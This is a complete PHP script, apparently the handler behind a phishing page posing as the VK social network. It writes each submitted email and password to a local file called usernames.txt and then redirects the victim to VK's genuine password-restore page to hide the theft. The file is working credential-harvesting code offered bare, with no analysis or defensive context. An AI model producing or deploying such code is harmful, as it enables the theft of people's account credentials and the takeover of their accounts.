<?php

file_put_contents("usernames.txt", "Vk :- username : " . $_POST['email'] . "  || Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://vk.com/restore/');
exit();
